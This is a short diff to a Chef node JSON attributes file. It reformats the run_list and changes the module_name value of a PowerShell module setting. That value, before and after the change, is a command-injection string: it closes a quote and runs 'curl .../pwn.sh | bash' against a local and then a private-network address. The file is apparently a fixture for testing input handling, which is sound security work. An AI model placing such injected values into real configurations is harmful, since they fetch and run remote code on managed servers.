@@ -1,9 +1,7 @@
 {
-  "run_list": [
-    "recipe[site_webserver::default]"
-  ],
+  "run_list": ["recipe[site_webserver::default]"],
   "fb_powershell_module": {
-    "module_name": "SafeModule'; curl http://localhost:8000/pwn.sh | bash; '",
+    "module_name": "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
     "repository": "PSGallery"
   }
 }
